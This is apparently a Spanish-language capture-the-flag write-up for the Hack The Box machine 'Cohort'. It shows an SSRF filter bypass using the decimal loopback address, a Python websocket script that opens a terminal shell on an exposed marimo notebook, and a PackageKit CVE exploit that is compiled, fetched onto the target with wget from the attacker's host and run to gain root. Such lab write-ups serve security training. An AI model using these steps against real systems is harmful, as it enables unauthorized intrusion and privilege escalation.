# Cohort
- Plat: HTB - 10.129.112.248
- nmap -sCV -Pn 10.129.112.248 para ver que tenemos :).
- al acceder a la ip por http redirige a cohort.htb -> procedemos a añadirlo a /etc/hosts (dns local)
- p 22,80,443 abiertos :O
- Investigamos la página web y vemos -> https://cohort.htb/portal.html y vemos que hay mediante una url podemos ver el código fuente de la web.
- <script>alert('hola')</script> no hay XSS
- Fuzzeamos la api y nada solo encontramos health.
- Probamos a hacer peticiones a ip loopback o localhoss,  lo bloquea si ponemos en http://2130706433/ ( numero decimal de ip loopback si funciona!!!)
- http://2130706433/status podemos ver el estado y el host host":"nb-1be3782a8afd3ad5.cohort.htb correcto!!
- lo añadimos tb a /etc/hosts
- https://nb-1be3782a8afd3ad5.cohort.htb ahora llegamos a un panel de login de marimo
- mediante el script -> import ssl
import threading
import websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = websocket.create_connection(
    url,
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="")
        except Exception:
            break

threading.Thread(target=receive, daemon=True).start()

for line in __import__("sys").stdin:
    ws.send(line.rstrip("\n") + "\n")

    conseguimos acceso.


- sudo -l nada necesitamos pw , id y group apra identificar todo.
- find / -perm -4000 -type f 2>/dev/null -> nada raro
- getcap -r / 2>/dev/null -> nada raro
- dpkg -l -> versiones de software interesantes -> VEo packagekit
- dpkg -l | grep packagekit para mostrar versión
- git clone https://github.com/Lutfifakee-Project/CVE-2026-41651.git
- cd CVE-2026-41651
- sudo apt install libglib2.0-dev -y
- gcc CVE-2026-41651.c -o exploit $(pkg-config --cflags --libs glib-2.0 gio-2.0)
- wget http://10.10.14.11:8080/exploit -O /tmp/exploit en la maquina afectada
- chmod +x /tmp/exploit
- /tmp/exploit ejecutamos el exploit y somos root pillamos flag
